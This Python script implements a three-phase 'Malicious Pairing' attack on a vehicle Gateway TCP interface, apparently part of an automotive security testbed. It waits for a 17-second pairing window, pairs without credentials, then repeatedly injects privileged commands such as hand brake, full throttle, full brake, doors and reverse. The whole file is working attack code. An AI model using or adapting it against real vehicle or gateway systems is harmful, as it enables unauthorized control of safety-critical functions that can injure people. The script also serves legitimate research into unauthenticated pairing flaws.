"""Malicious Pairing attack (V1 unauthenticated pairing + V2 17s window)."""

import json
import socket
import time
from typing import Optional

DEFAULT_GATEWAY_HOST = "127.0.0.1"
DEFAULT_GATEWAY_PORT = 5555

# Maps CLI target names to (Gateway command name, injected signal value).
TARGET_COMMAND_MAP = {
    "hand_brake": ("HAND_BRAKE", 1),
    "doors":      ("DOORS",      1),
    "throttle":   ("THROTTLE",   255),
    "brake":      ("BRAKE",      255),
    "reverse":    ("REVERSE",    1),
}


def _request_json(sock_file, sock: socket.socket, payload: dict) -> dict:
    """Send one newline-delimited JSON request and return the decoded response."""
    sock.sendall((json.dumps(payload) + "\n").encode("utf-8"))
    line = sock_file.readline()
    if not line:
        raise ConnectionError("Gateway closed the connection.")
    return json.loads(line)


def run_malicious_pairing_attack(
    target: str = "hand_brake",
    host: str = DEFAULT_GATEWAY_HOST,
    port: int = DEFAULT_GATEWAY_PORT,
    period: float = 0.1,
    poll_interval: float = 0.2,
    client_id: int = 99,
    max_injections: Optional[int] = None,
    on_status=None,
):
    """Execute the 3-phase Malicious Pairing attack against the Gateway TCP interface."""
    if target not in TARGET_COMMAND_MAP:
        raise ValueError(
            f"Unsupported target '{target}'. Choose from {sorted(TARGET_COMMAND_MAP)}."
        )
    cmd_name, cmd_value = TARGET_COMMAND_MAP[target]

    with socket.create_connection((host, port), timeout=5.0) as sock:
        sock_file = sock.makefile("r", encoding="utf-8")

        # Phase 1: Sniff / poll until the 17s pairing window opens (V2).
        print(f"[MP] Connected to Gateway at {host}:{port}. Waiting for pairing window (HIGH_BEAM)...")
        while True:
            status = _request_json(sock_file, sock, {"type": "status"})
            if status.get("pairing_mode_active"):
                print(
                    f"[MP] Pairing window detected! "
                    f"({status.get('remaining_seconds', 0):.1f}s remaining)"
                )
                break
            time.sleep(poll_interval)

        # Phase 2: Unauthenticated pairing (V1).
        pair_resp = _request_json(
            sock_file, sock, {"type": "pair", "client_id": client_id}
        )
        if not pair_resp.get("ok"):
            raise RuntimeError(f"Pairing rejected by Gateway: {pair_resp}")
        print(f"[MP] Paired with Gateway as client_id={client_id} without credentials!")

        # Phase 3: Periodic privileged command injection.
        sent = 0
        t0 = time.monotonic()
        while max_injections is None or sent < max_injections:
            resp = _request_json(
                sock_file,
                sock,
                {
                    "type": "cmd",
                    "client_id": client_id,
                    "cmd": cmd_name,
                    "value": cmd_value,
                },
            )
            if not resp.get("ok"):
                raise RuntimeError(f"Command injection failed: {resp}")
            sent += 1
            elapsed = time.monotonic() - t0 or 1e-9
            if on_status is not None:
                on_status(target, sent, sent / elapsed, resp)
            time.sleep(period)
